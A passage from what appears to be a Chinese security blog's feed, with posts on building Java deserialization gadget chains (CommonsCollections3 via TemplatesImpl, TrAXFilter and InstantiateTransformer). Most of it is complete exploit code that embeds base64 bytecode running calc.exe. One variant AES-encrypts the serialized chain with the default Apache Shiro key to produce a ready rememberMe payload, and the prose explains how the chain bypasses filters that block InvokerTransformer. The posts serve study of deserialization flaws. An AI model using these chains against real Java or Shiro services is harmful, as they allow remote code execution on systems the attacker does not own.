org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;);</span><br><span class="line">        Transformer fakeTransformers=<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,fakeTransformers);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap,TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme,<span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line"></span><br><span class="line">        setFieldValue(outerMap,<span class="string">&quot;factory&quot;</span>,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加密</span></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/03/ZstUKnb19yxMG73.png" alt="image.png"></p><p>很漂亮，原理都是一样的，这里把<code>TrAXFilter.class</code>传进来就好了</p><p>好累呀好累呀 回去躺平咯</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用TemplatesImp攻击Shiro&quot;&gt;&lt;a href=&quot;#利用TemplatesImp攻击Shiro&quot; class=&quot;headerlink&quot; title=&quot;利用TemplatesImp攻击Shiro&quot;&gt;&lt;/a&gt;利用TemplatesImp攻击Shiro&lt;/h1&gt;&lt;p&gt;这篇文章虽然写的是攻击Shiro，但实际上跟shiro关系不算特别大，主要是利用&lt;code&gt;TemplatesImpl&lt;/code&gt;构造一条cc的链子，其实我们都已经有&lt;code&gt;CommonsCollections6&lt;/code&gt;这样可以通杀的利用链了，那么为什么还需要&lt;code&gt;TemplatesImpl&lt;/code&gt;这种呢？因为&lt;code&gt;TemplatesImpl&lt;/code&gt;理论上是可以执行任意Java代码的，通用性非常高&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 3</title>
    <link href="https://arsenetang.github.io/2022/03/01/Java%E7%AF%87%E4%B9%8BCommonsCollections%203/"/>
    <id>https://arsenetang.github.io/2022/03/01/Java%E7%AF%87%E4%B9%8BCommonsCollections%203/</id>
    <published>2022-02-28T16:00:00.000Z</published>
    <updated>2022-03-07T13:58:58.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Collections-3"><a href="#Commons-Collections-3" class="headerlink" title="Commons Collections 3"></a>Commons Collections 3</h1><p>前面我们讲到了利用<code>TemplatesImpl</code>加载字节码，只不过那时我们是手动调用的<code>newTransformer</code>来触发的，接下来我们就来看看如何利用cc链来触发，以及cc3中用到的新类</p><span id="more"></span><p>这里用cc链来触发，实际上就是指用<code>InvokerTransformer</code>来调用<code>newTransformer</code>这个方法嘛，和前面的方法是一样的，这里我就直接给出代码了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer [] transformers = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(obj),<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)&#125;;</span><br><span class="line">        Transformer transformersChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//Map outerMap = TransformedMap.decorate(innerMap,null,transformersChain);</span></span><br><span class="line">        <span class="comment">//outerMap.put(&quot;name&quot;,&quot;Arsene.Tang&quot;);</span></span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformersChain);</span><br><span class="line">        outerMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/01/cUGWEVOL9k4zp6Z.png" alt="image.png"></p><p>这里是用的手动触发，当然我们还可以改成反序列化触发，甚至于写成更加通用的cc6的链子，这里面的内容好像我前面的文章都讲了，这儿我就不浪费时间了，直接切进主题，看看cc3</p><h2 id="为什么要出现cc3"><a href="#为什么要出现cc3" class="headerlink" title="为什么要出现cc3"></a>为什么要出现cc3</h2><p>其实在前面我们已经已经有一条cc6的通用链子了，那我们为什么还需要cc3呢，因为我们得绕过一些过滤，因为现在很多的反序列化过滤器都过滤掉了<code>InvokerTransformer</code>，这样我们原始的cc1的链子就打不通了，所以说我们得换个类来代替它</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>而这个类就是<code>org.apache.commons.collections.functors.InstantiateTransformer</code>，<code>InstantiateTransformer</code>类也是实现了<code>Transformer</code>接口的一个类，而它的作用是调用构造方法，先看看它的代码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能大家会有疑问，只能调用构造方法有什么用呢，那假如我们能找到一个类，在它的构造方法中，正好就调用了<code>TransformerImpl</code>类中的<code>newTransformer()</code>方法，那不就完美了嘛</p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p>而这个类，就是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>，在这个类的构造方法中，就正好调用了<code>(TransformerImpl) templates.newTransformer()</code>，免去了我们使用<code>InvokerTransformer</code>手工调用<code>newTransformer</code>了，看看它的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Templates              _templates;</span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="keyword">private</span> TransformerHandlerImpl _transformerHandler;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> _overrideDefaultParser;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//调用</span></span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">        _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这不就好起来了，只要我们利用<code>InstantiateTransformer</code>来调用到<code>TrAXFilter</code>的构造方法，那么它就会自动调用<code>templates.newTransformer()</code>，就可以加载我们放在<code>TemplatesImpl</code>里面的字节码了</p><p>所以说调用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;)</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>把这个<code>Transformer</code>数组替换掉之前那个数组就可以了，所以说完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformersChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformersChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/01/FQT2G8EAvap3tLb.png" alt="image.png"></p><p>成功弹出计算器，当然这也是手动触发哈，想要反序列化触发就看看前面的文章吧POC改改就好了哦</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-3&quot;&gt;&lt;a href=&quot;#Commons-Collections-3&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 3&quot;&gt;&lt;/a&gt;Commons Collections 3&lt;/h1&gt;&lt;p&gt;前面我们讲到了利用&lt;code&gt;TemplatesImpl&lt;/code&gt;加载字节码，只不过那时我们是手动调用的&lt;code&gt;newTransformer&lt;/code&gt;来触发的，接下来我们就来看看如何利用cc链来触发，以及cc3中用到的新类&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Java动态加载字节码</title>
    <link href="https://arsenetang.github.io/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <id>https://arsenetang.github.io/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</id>
    <published>2022-02-27T16:00:00.000Z</published>
    <updated>2022-02-28T12:25:27.294Z</updated>
    
